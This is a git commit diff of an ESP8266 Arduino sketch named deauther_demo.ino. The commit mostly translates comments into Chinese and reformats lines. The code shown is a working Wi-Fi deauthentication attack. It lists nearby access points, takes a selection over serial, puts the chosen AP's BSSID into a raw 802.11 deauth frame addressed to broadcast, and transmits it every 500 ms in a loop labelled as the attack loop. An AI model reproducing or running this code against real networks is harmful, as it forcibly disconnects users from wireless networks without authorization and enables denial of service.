fad7106d915033e51550326b5409023fddd5a3e4
Mingda Song <songmingda1234@hotmail.com>
2018-11-21 18:02:50 +0800

    modified:   deauther_demo.ino

--- deauther_demo.ino
+++ deauther_demo.ino
@@ -4,14 +4,15 @@ extern "C" {
 #include "user_interface.h"
 }
 
+//Deauthentication管理帧
 uint8_t deauthPacket[26] = {
-  /*  0 - 1  */ 0xC0, 0x00,                         //Type, subtype c0: deauth (a0: disassociate)
-  /*  2 - 3  */ 0x00, 0x00,                         //Duration (SDK takes care of that)
-  /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, //Reciever (target, broadcast)
-  /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, //Source (ap)
-  /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, //BSSID (ap)
-  /* 22 - 23 */ 0x00, 0x00,                         //Fragment & squence number
-  /* 24 - 25 */ 0x01, 0x00                          //Reason code (1 = unspecified reason)
+  /*  0 - 1  */ 0xC0, 0x00,                         //类型, 子类型 C0: 结束鉴权 (A0: 解除连接)
+  /*  2 - 3  */ 0x00, 0x00,                         //时长 (SDK 自动填充这部分)
+  /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, //接收方 (目标, 广播)
+  /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, //发送方 (AP)
+  /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, //发送方 (AP)
+  /* 22 - 23 */ 0x00, 0x00,                         //分片&序列号
+  /* 24 - 25 */ 0x01, 0x00                          //原因(1 = 未知原因)
 };
 
 void setup() {
@@ -34,12 +35,15 @@ void setup() {
 //选择热点
   while(true) {
     Serial.println("Select AP...");
-    while(!Serial.available()) delay(50);
+    while(!Serial.available())
+      delay(50);
     selected = Serial.parseInt();
-    if(selected < ap_count || selected > 0) break;
+    if(selected < ap_count || selected > 0)
+      break;
   }
   selected_ch = WiFi.channel(selected - 1);
-  for(i = 0; i < 6; i++) selected_ap[i] = WiFi.BSSID(selected - 1)[i];
+  for(i = 0; i < 6; i++)
+	selected_ap[i] = WiFi.BSSID(selected - 1)[i];
   selected_ssid = WiFi.SSID(selected - 1);
 
 //设置参数
@@ -47,23 +51,27 @@ void setup() {
   Serial.print(selected_ssid);
   Serial.print('[');
   for (i = 0; i < 6; i++) {
-    if (selected_ap[i] < 0x10) Serial.print('0');
+    if (selected_ap[i] < 0x10)
+      Serial.print('0');
     Serial.print(selected_ap[i], HEX);
-    if (i < 5) Serial.print(':');
+    if (i < 5)
+      Serial.print(':');
   }
   Serial.print("] on CH");
   Serial.println(selected_ch);
   wifi_set_channel(selected_ch);
   for(i = 0; i < 6; i++)
     deauthPacket[10 + i] = deauthPacket[16 + i] = selected_ap[i];
+
+//开启混杂模式
+  wifi_promiscuous_enable(1);
 }
 
 void loop() {
 //循环攻击
-  wifi_promiscuous_enable(1);
   if(wifi_send_pkt_freedom(deauthPacket, 26, 0) == -1) {
-    Serial.println("Deauth error");
+    Serial.println("Deauth error");//若不断打印这句话，请检查环境配置是否正确
     return;
   }
-  delay(500);
+  delay(500);//延时，避免数据包堵塞
 }
